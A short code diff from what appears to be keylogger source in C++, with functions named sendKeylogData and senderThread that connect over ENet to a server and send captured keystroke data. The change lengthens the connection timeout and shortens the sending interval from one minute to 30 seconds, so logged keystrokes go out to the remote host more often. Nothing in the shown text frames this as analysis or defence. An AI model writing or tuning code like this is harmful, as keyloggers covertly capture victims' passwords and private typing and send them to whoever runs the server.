@@ -152,7 +152,7 @@ void sendKeylogData() {
     
     // Wait for connection
     ENetEvent event;
-    if (enet_host_service(client, &event, 5000) <= 0 || event.type != ENET_EVENT_TYPE_CONNECT) {
+    if (enet_host_service(client, &event, 10000) <= 0 || event.type != ENET_EVENT_TYPE_CONNECT) {
         enet_peer_reset(peer);
         enet_host_destroy(client);
         enet_deinitialize();
@@ -223,7 +223,7 @@ void sendKeylogData() {
 void senderThread() {
     while (isKeyloggerRunning) {
         // Sleep for one minute
-        std::this_thread::sleep_for(std::chrono::minutes(1));
+        std::this_thread::sleep_for(std::chrono::seconds(30));
         
         // Send data to server
         sendKeylogData();
